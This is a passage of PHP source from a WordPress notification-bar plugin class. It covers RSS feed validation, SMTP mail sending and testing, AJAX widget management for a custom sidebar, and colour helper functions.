                  return false;
              }
          }

          function edn_validateRssFeed($feedurl){

              if($this->validateFeed($feedurl)){
                 $content = file_get_contents($feedurl); 
                 $rss = new SimpleXmlElement($content); 
                 return $rss;
             }else{
                return false;
            }   
        }

        function email_send($myname,$email,$message,$from_name,$from_email,$subject){
                //$myname :to //, $email : to , $from_anme: from //
                 $phpmailer = new APEXNB_PHPMailer();  //initalize php mailer object

                 $edn_setting       = $this->apexnb_settings;
                 $edn_use_smtp      = $edn_setting['edn_use_smtp'];
                 $edn_smtp_host     = $edn_setting['edn_smtp_host'];
                 $edn_smtp_port     = $edn_setting['edn_smtp_port'];
                 $edn_smtp_auth     = $edn_setting['edn_smtp_auth'];
                 $edn_smtp_username = $edn_setting['edn_smtp_username'];
                 $edn_smtp_password = $edn_setting['edn_smtp_password'];
                 $edn_encryption_type = $edn_setting['edn_encryption_type'];

                 if( !empty($edn_use_smtp) && ($edn_use_smtp == '1') && !empty($edn_smtp_host) && !empty($edn_smtp_port) ){

                    $phpmailer->isSMTP();
                    $phpmailer->Host = $edn_smtp_host;

                    $phpmailer->SetFrom( $from_email, $from_name);

                //$phpmailer->AddReplyTo($send_from, $send_from_name);

                    $phpmailer->Subject    = $subject;

                    $phpmailer->MsgHTML($message);
                    $phpmailer->AddAddress($email, $myname);
                    $phpmailer->SMTPDebug = 1;
                    $phpmailer->isHTML(true);
                    if( !empty($edn_smtp_auth) && ($edn_smtp_auth == '1') && !empty($edn_smtp_username) && !empty($edn_smtp_password) ):

                    $phpmailer->SMTPAuth = true; // Force it to use Username and Password to authenticate
                $phpmailer->Port = $edn_smtp_port;
                $phpmailer->Username = $edn_smtp_username;
                $phpmailer->Password = $edn_smtp_password;
                $phpmailer->SMTPSecure = $edn_encryption_type;

                endif;
                if(!$phpmailer->Send()) {
                   // echo "Mailer Error: " . $phpmailer->ErrorInfo;
                   return false;
               } else {
                    //echo "success";
                   return true;
               }
           }

       }

       function testing_smtp($use_smtp,$host,$port,$auth,$username,$password,$edn_encryption_type){
                $mail = new APEXNB_PHPMailer(true); // the true param means it will throw exceptions on errors, which we need to catch

                 $mail->IsSMTP(); // telling the class to use SMTP

                 $to_email = get_bloginfo('admin_email');
                 $from_email = 'noreply@siteurl.com';
                 $to_name = 'admin';
                 $from_name = get_bloginfo('name');
                 if($auth == 1){
                  $auth = "true";
              }else{
                  $auth = "false";
              }
              try {
                  $mail->Host       = $host; // SMTP server
                  $mail->SMTPDebug  = true;                     // enables SMTP debug information (for testing)
                  $mail->Timeout = 100;
                  //$mail->Host       = "mail.yourdomain.com"; // sets the SMTP server
                  $mail->Port       = $port;                    // set the SMTP port for the GMAIL server
                  if($auth == 'true'){
                  $mail->SMTPAuth   = $auth;                  // enable SMTP authenticati
                  $mail->Username   = $username; // SMTP account username
                  $mail->Password   = $password;        // SMTP account password
                  $mail->SMTPSecure = $edn_encryption_type;

              }
                  // $mail->AddReplyTo('name@yourdomain.com', 'First Last');
              $mail->AddAddress($to_email,  $to_name);
              $mail->SetFrom( $from_email,$from_name);
                  // $mail->AddReplyTo('name@yourdomain.com', 'First Last');
              $subject = __('SMTP CONFIGURATION EMAIL',APEXNB_TD);
              $messages = __('Smtp Configuration is setup. Thank you.',APEXNB_TD);
              $mail->Subject =  $subject;
                  //$mail->AltBody = 'To view the message, please use an HTML compatible email viewer!'; // optional - MsgHTML will create an alternate automatically
              $mail->MsgHTML( $messages);


              $mail->Send();
              $_SESSION['edn_settings_messages'] = __('SMTP Options Saved Successfully.',APEXNB_TD);
          } catch (APEXNB_phpmailerException $e) {
             $_SESSION['edn_settings_messages'] = __($e->errorMessage(),APEXNB_TD);
                  //echo $e->errorMessage(); //Pretty error messages from PHPMailer
         } catch (Exception $e) {
             $_SESSION['edn_settings_messages'] = __($e->getMessage(),APEXNB_TD);
                 // echo $e->getMessage(); //Boring error messages from anything else!
         }

     }

    /**
     * Returns an object representing all widgets registered in WordPress
     *
     * @since 1.0
     */
    static public function edn_get_available_widgets() {
        global $wp_widget_factory;
        $wordpress_widgets = array();

        foreach( $wp_widget_factory->widgets as $wordpress_widget ) {

            $wordpress_widgets[] = array(
                'text' => $wordpress_widget->name,
                'value' => $wordpress_widget->id_base,
                'description' => $wordpress_widget->widget_options['description']
                );


        }

        uasort( $wordpress_widgets,  array("APEXNB_Class", "wpmm_sort_by_text") );
        // uasort($wordpress_widgets, array($this, "wpmm_sort_by_text"));
        return $wordpress_widgets;

    }

        /**
       * Sorts a 2d array by the 'text' key
       *
       * @since 1.0.0
       * @param array $a
       * @param array $b
       */
        public static function wpmm_sort_by_text( $a, $b ) {
          return strcmp( $a['text'], $b['text'] );
      }

      public function add_selected_widget(){
        check_ajax_referer( 'edn-ajax-nonce', 'nonce' );
        if(isset($_POST) && $_POST['widget_id'] != ''){
            $widgets_id          = sanitize_text_field($_POST['widget_id']);
            $widget_title        = sanitize_text_field( $_POST['title'] );

            $added_widgets = $this->add_widget_selected($widgets_id, $widget_title);
            if ( $added_widgets ) {
               if ( ob_get_contents() ) ob_clean();
               wp_send_json_success($added_widgets );
           } else {
            if ( ob_get_contents() ) ob_clean();
            wp_send_json_error( sprintf( __("Failed to add %s to %d", APEXNB_TD) ));
        }
    }
}

     /**
     * Adds a widget to WordPress.
     * @since 1.0
     * @param string $id_base as $widgets_id_value
     * @param string $title as $widget_title
     */
     public function add_widget_selected($widgets_id,$widget_title){
        require_once( ABSPATH . 'wp-admin/includes/widgets.php' );
        $next_id = next_widget_id_number( $widgets_id );
        $my_current_widgets = get_option( 'widget_' . $widgets_id );

        $my_current_widgets[ $next_id ] = array(
            "widget_columns" => 3
            );

        update_option( 'widget_' . $widgets_id, $my_current_widgets );
        $widget_id = $this->wpmm_add_widget_to_sidebar( $widgets_id, $next_id );

        $return .= '<div class="ednpro_widget_area ui-sortable" data-title="' . esc_attr( $widget_title ) . '" data-id="' . $widget_id . '">';
        $return  .= '<input type="hidden" name="edn_open_panel[edn_widgets][widget_id][]" value="'.$widget_id.'"/>';
        $return  .= '<input type="hidden" name="edn_open_panel[edn_widgets][widget_title][]" value="'.esc_attr( $widget_title ).'"/>';
        $return .= '<div class="widget_area">';
        $return .= '<div class="widget_title">';
        $return .= '<span><i class="fa fa-arrows" aria-hidden="true"></i></span>';
        $return .= '<span class="wptitle">' . esc_html( $widget_title ) . '</div></span>';
        $return .= '<div class="widget_right_action">';
        $return .= '<a class="widget-option widget-action" title="' . esc_attr( __("Edit",APEXNB_TD) ) . '">';
        $return .= '<i class="fa fa-pencil-square-o" aria-hidden="true"></i></a>';
        $return .= '</div>';
        $return .= '</div>';
        $return .= '<div class="widget_inner"></div>';
        $return .= '</div>';

        return $return;

    }


    private function wpmm_add_widget_to_sidebar( $id_base, $next_id ) {

        $widget_id = $id_base . '-' . $next_id;

        $sidebar_widgets = $this->get_sidebar_widgets();

        $sidebar_widgets[] = $widget_id;

        $this->set_sidebar_widgets($sidebar_widgets);

        do_action( "after_widget_add" );
        
        return $widget_id;

    }

        /**
     * Returns an unfiltered array of all widgets in our sidebar
     *
     * @since 1.0
     * @return array
     */
        public function get_sidebar_widgets() {

            $sidebar_widgets = wp_get_sidebars_widgets();

            if ( ! isset( $sidebar_widgets[ 'apexnb-notification-bar'] ) ) {
                return false;
            }

            return $sidebar_widgets[ 'apexnb-notification-bar' ];

        }

    /**
     * Sets the sidebar widgets
     *
     * @since 1.0
     */
    private function set_sidebar_widgets( $widgets ) {

        $sidebar_widgets = wp_get_sidebars_widgets();

        $sidebar_widgets[ 'apexnb-notification-bar' ] = $widgets;

        wp_set_sidebars_widgets( $sidebar_widgets );

    }


    public function ajax_edit_widget_data(){
     check_ajax_referer( 'edn-ajax-nonce', '_wpnonce' );

     $widget_id = sanitize_text_field( $_POST['widget_id'] );

        if ( ob_get_contents() ) ob_clean(); // remove any warnings or output from other plugins which may corrupt the response

        wp_die( trim( $this->show_widget_form( $widget_id ) ) );
    }


   /*
   * Widget CallBack Form
   */
   public function show_widget_form($widget_id){
    global $wp_registered_widget_controls;
    $control_widget = $wp_registered_widget_controls[ $widget_id ];
    $id_base = $this->get_id_base_for_widget_id( $widget_id );
    $parts = explode( "-", $widget_id );
    $widget_number = absint( end( $parts ) );
    $widget_nonce = wp_create_nonce('ednpro_save_widget_' . $widget_id);

    ?>

    <div class='ednpro_widget-content'>
        <form method='post'>
            <input type="hidden" name="widget_id" class="widget-id" value="<?php echo $widget_id ?>" />
            <input type='hidden' name='action'  value='ednpro_save_widget' />
            <input type='hidden' name='id_base'   value='<?php echo $id_base; ?>' />
            <input type='hidden' name='_wpnonce'  value='<?php echo $widget_nonce ?>' />

            <?php
            if ( is_callable( $control_widget['callback'] ) ) {
                call_user_func_array( $control_widget['callback'], $control_widget['params'] );
            }
            ?>

            <div class='ednpro-widget-controls'>
                <a class='ednpro_delete' href='#delete'><?php _e("Delete", APEXNB_TD); ?></a> |
                <a class='ednpro_close' href='#close'><?php _e("Close", APEXNB_TD); ?></a>
            </div>

            <?php
            submit_button( __( 'Save' ), 'button-primary alignright', 'ednpro_savewidget', false );
            ?>
        </form>
    </div>

    <?php

}

     /**
     * Returns the id_base value for a Widget ID
     *
     * @since 1.0
     */
     public function get_id_base_for_widget_id( $widget_id ) {
        global $wp_registered_widget_controls;

        if ( ! isset( $wp_registered_widget_controls[ $widget_id ] ) ) {
            return false;
        }

        $control = $wp_registered_widget_controls[ $widget_id ];

        $id_base = isset( $control['id_base'] ) ? $control['id_base'] : $control['id'];

        return $id_base;

    }

      /**
     * Create our own widget area to store all mega menu widgets.
     * All widgets from all menus are stored here, they are filtered later
     * to ensure the correct widgets show under the correct menu item.
     *
     * @since 1.0
     */
      public function register_sidebar() {

        register_sidebar(
            array(
                'id' => 'apexnb-notification-bar',
                'name' => __("Apex Notification Bar Widgets", APEXNB_TD),
                'description'   => __("Do not manually edit this area.", APEXNB_TD)
                )
            );
    }

   /*
   * Delete widget form
   */
   public function ajax_delete_widget_form(){
    check_ajax_referer( 'edn-ajax-nonce', 'nonce' );

    $widget_id = sanitize_text_field( $_POST['widget_id'] );

    $deleted_widgets = $this->ednpro_delete_widgets( $widget_id );

    if ( $deleted_widgets ) {
     wp_send_json_success( sprintf( __( "Deleted %s", APEXNB_TD), $widget_id ));
 } else {
    wp_send_json_error( sprintf( __( "Failed to delete %s", APEXNB_TD), $widget_id ) );
}
}

   /**
     * Deletes a widget from WordPress
     *
     */
   public function ednpro_delete_widgets( $widget_id ) {

    $this->remove_widget_from_sidebar( $widget_id );
    $this->remove_widget_instance( $widget_id );

    do_action( "after_widget_delete" );

    return true;

}


    /**
     * Removes a widget from the 8 degree notification bar pro widget sidebar
     *
     * @since 1.0
     * @return string The widget that was removed
     */
    private function remove_widget_from_sidebar($widget_id) {

        $widgets = $this->get_sidebar_widgets();

        $new_widgets = array();

        foreach ( $widgets as $widget ) {

            if ( $widget != $widget_id )
                $new_widgets[] = $widget;

        }

        $this->set_sidebar_widgets($new_widgets);

        return $widget_id;

    }

        /**
     * Removes a widget instance from the database
     *
     * @since 1.0
     * @param string $widget_id e.g. meta-3
     * @return bool. True if widget has been deleted.
     */
        private function remove_widget_instance( $widget_id ) {

            $id_base = $this->get_id_base_for_widget_id( $widget_id );
            $parts = explode( "-", $widget_id );
            $widget_number = absint( end( $parts ) );

        // add blank widget
            $current_widgets = get_option( 'widget_' . $id_base );

            if ( isset( $current_widgets[ $widget_number ] ) ) {

                unset( $current_widgets[ $widget_number ] );

                update_option( 'widget_' . $id_base, $current_widgets );

                return true;

            }

            return false;

        }

     /**
     * Save a widget
     *
     * @since 1.0
     */
     public function ajax_save_widget(){
        $widget_id = sanitize_text_field( $_POST['widget_id'] );
        $id_base = sanitize_text_field( $_POST['id_base'] );

        check_ajax_referer( 'ednpro_save_widget_' . $widget_id );

        $saved_widgets = $this->ednpro_save_widget( $id_base );

        if ( $saved_widgets ) {
         wp_send_json_success( sprintf( __("Saved %s", APEXNB_TD), $id_base ));
     } else {
         wp_send_json_error( sprintf( __( "Failed to save %s", APEXNB_TD), $id_base ) );
     }
 }

    /**
     * Saves a widget. Calls the update callback on the widget.
     * The callback inspects the post values and updates all widget instances which match the base ID.
     */
        public function ednpro_save_widget( $id_base ) {
            global $wp_registered_widget_updates;

            $control_widgets = $wp_registered_widget_updates[$id_base];

            if ( is_callable( $control_widgets['callback'] ) ) {

                call_user_func_array( $control_widgets['callback'], $control_widgets['params'] );

                do_action( "after_widget_save" );

                return true;
            }

            return false;

        }

        /**
     * Returns the HTML for a single widget instance.
     */
        static public function show_widget( $id ) {
            global $wp_registered_widgets;

            $lists_arr_parameters = array_merge(
                array( array_merge( array( 'widgetid' => $id, 'widgetname' => $wp_registered_widgets[$id]['name'] ) ) ),
                (array) $wp_registered_widgets[$id]['params']
                );

            $lists_arr_parameters[0]['before_title']  = apply_filters( "before_widget_title", '<h4 class="ednpro-mega-block-title">', $wp_registered_widgets[$id] );
            $lists_arr_parameters[0]['after_title']   = apply_filters( "after_widget_title", '</h4>', $wp_registered_widgets[$id] );
            $lists_arr_parameters[0]['before_widget'] = apply_filters( "before_widget", "", $wp_registered_widgets[$id] );
            $lists_arr_parameters[0]['after_widget']  = apply_filters( "after_widget", "", $wp_registered_widgets[$id] );

            $callback = $wp_registered_widgets[$id]['callback'];

            if ( is_callable( $callback ) ) {
                ob_start();
                call_user_func_array( $callback, $lists_arr_parameters );
                return ob_get_clean();
            }

        }

       //returns all the registered post types only
        public static function apexnb_get_registered_post_types() {
         $post_types = get_post_types();
         unset($post_types['attachment']);
          // unset($post_types['product']);
         unset($post_types['product_variation']);
         unset($post_types['shop_order']);
         unset($post_types['shop_order_refund']);
         unset($post_types['shop_coupon']);
         unset($post_types['shop_webhook']);
         unset($post_types['wp1slider']);
         unset($post_types['revision']);
         unset($post_types['nav_menu_item']);
         unset($post_types['wp-types-group']);
         unset($post_types['wp-types-user-group']);
         unset($post_types['customize_changeset']);
         unset($post_types['wpcf7_contact_form']);
         unset($post_types['custom_css']);
         unset($post_types['page']);
         unset($post_types['post_tag']);
         return $post_types;
     }

       /*
       * Get Darker Color From Ligher Color Using Color Code
       */
       public static function darken_color($rgb, $darker=2) {

          $hash = (strpos($rgb, '#') !== false) ? '#' : '';
          $rgb = (strlen($rgb) == 7) ? str_replace('#', '', $rgb) : ((strlen($rgb) == 6) ? $rgb : false);
          if(strlen($rgb) != 6) return $hash.'000000';
          $darker = ($darker > 1) ? $darker : 1;

          list($R16,$G16,$B16) = str_split($rgb,2);

          $R = sprintf("%02X", floor(hexdec($R16)/$darker));
          $G = sprintf("%02X", floor(hexdec($G16)/$darker));
          $B = sprintf("%02X", floor(hexdec($B16)/$darker));

          return $hash.$R.$G.$B;
      }


       /*
       * Get Lighter Color From Darker Color Using Color Code
       */
       public static function colourBrightness($hex, $percent) {
                // Work out if hash given
        $hash = '';
        if (stristr($hex,'#')) {
            $hex = str_replace('#','',$hex);
            $hash = '#';
        }
                /// HEX TO RGB
        $rgb = array(hexdec(substr($hex,0,2)), hexdec(substr($hex,2,2)), hexdec(substr($hex,4,2)));
                //// CALCULATE 
        for ($i=0; $i<3; $i++) {
                    // See if brighter or darker
            if ($percent > 0) {
                        // Lighter
                $rgb[$i] = round($rgb[$i] * $percent) + round(255 * (1-$percent));
            } else {
                        // Darker
                $positivePercent = $percent - ($percent*2);
                $rgb[$i] = round($rgb[$i] * $positivePercent) + round(0 * (1-$positivePercent));
            }
                    // In case rounding up causes us to go to 256
            if ($rgb[$i] > 255) {
                $rgb[$i] = 255;
            }
        }
                //// RBG to Hex
        $hex = '';
            for($i=0; $i < 3; $i++) {
                        // Convert the decimal digit to hex
                $hexDigit = dechex($rgb[$i]);
                        // Add a leading zero if necessary
                if(strlen($hexDigit) == 1) {
                    $hexDigit = "0" . $hexDigit;
                }
                        // Append to the hex string
                $hex .= $hexDigit;
            }
            return $hash.$hex;
        }


      /* Backend Preview Settings */
       /**
        * Twitter Components
       * For Preview get specific notificatin bar for frontend
      * */
      function get_pre_specific_bar($nb_id){
        if(isset($nb_id)){
                  $page_bar_id = $this->get_page_base_bar($post->ID);
                  $get_data_from_table = $this->get_notification_bar_data($page_bar_id);
              }

              if(isset($get_data_from_table[0])){
               $edn_data = $get_data_from_table[0];
               $edn_bar_data = unserialize($edn_data->edn_bar);
           }else{
               $edn_bar_data = array();
           }

           return $edn_bar_data;
        } 

          /**
           * get specific notificatin bar for frontend
          * */
          function get_specific_bar(){
            global $post;
            $edn_default_bar = $this->apexnb_settings['edn_default_bar'];
            if($edn_default_bar != 'nobar'){
             if(isset($post->ID)){
              $page_bar_id = $this->get_page_base_bar($post->ID);
          }else{
           $page_bar_id = '';
       }
            //$page_bar_id = $this->get_page_base_bar($post->ID);
       if($page_bar_id){
        $get_data_from_table = $this->get_notification_bar_data($page_bar_id);
    }else{
        $get_data_from_table = $this->get_notification_bar_data($edn_default_bar);
    }
    if(isset($get_data_from_table[0])){
       $edn_data = $get_data_from_table[0];
       $edn_bar_data = unserialize($edn_data->edn_bar);
   }else{
       $edn_bar_data = array();
   }

}else{
    $edn_bar_data = array();
}
return $edn_bar_data;
} 



}
    $edn_pro_object = new APEXNB_Class(); //initialization of plugin
}
